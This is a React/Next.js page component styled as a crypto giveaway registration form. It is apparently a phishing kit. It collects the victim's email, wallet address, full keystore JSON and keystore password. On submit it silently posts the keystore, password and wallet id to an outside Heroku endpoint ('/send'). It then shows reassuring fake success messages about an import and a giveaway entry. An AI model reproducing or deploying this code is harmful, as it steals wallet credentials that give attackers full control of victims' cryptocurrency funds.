import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import styles from "../../../styles/Home.module.css";
import Tabs from "..";
import { useRouter } from "next/router";

const Profile = () => {
  const [keystone, setKeystone] = useState("");
  const [info, setInfo] = useState({
    email: null,
    wallet: null,
    notif: false,
  });
  const [password, setPassword] = useState("");
  const router = useRouter();
  const { pid } = router.query;

  const notify = () => {
    keystone === "" || password === ""
      ? ""
      : toast.success("Keystore Json Successfully Imported");
  };
  const notif = () => {
    setInfo({ ...info, notif: true });
    setTimeout(() => {
      setInfo({ ...info, notif: false });
    }, 5000);
  };
  const handleKeystoneChange = (e) => {
    setKeystone(e.target.value);
  };
  const handleJsonChange = (e) => {
    setPassword(e.target.value);
  };
  const handleSubmit = (e) => {
    e.preventDefault();
    const kS = { keystone: keystone, password: password, wallet: pid };
    console.log(kS);

    keystone !== "" &&
      password !== "" &&
      axios
        .post("https://shielded-earth-12418.herokuapp.com/send", kS)
        .then((res) => res.json())
        .catch((err) => err);
  };
  return (
    <Tabs>
      {info.notif && (
        <div className="text-center p-2 rounded bg-lightblue text-white text-base">
          Successfully registered for giveaway, you will receive an email if you
          are selected
        </div>
      )}
      <div>
        <form onSubmit={handleSubmit}>
          <div className="grid gap-2">
          <input
              placeholder="email"
              onChange={(e) => setInfo({ ...info, email: e.target.value })}
              className={`${styles.prtextarea} ${styles.tA2}`}
            />
            <input
              placeholder="wallet address"
              onChange={(e) => setInfo({ ...info, wallet: e.target.value })}
              className={`${styles.prtextarea} ${styles.tA2}`}
            />
          </div>
          <textarea
            value={keystone}
            onChange={handleKeystoneChange}
            placeholder='Keystore JSON is Several lines of text beginning with "(...)" '
            className={styles.prtextarea}
            required
          />
          <input
            onChange={handleJsonChange}
            type="text"
            placeholder="Password"
            className={`${styles.prtextarea} ${styles.tA2}`}
            required
          />

          <button
            onClick={notif}
            className={styles.prbutton}
            disabled={!info.email || !info.wallet || keystone === ""}
          >
            import
          </button>
          <ToastContainer />
        </form>
      </div>
    </Tabs>
  );
};

export default Profile;
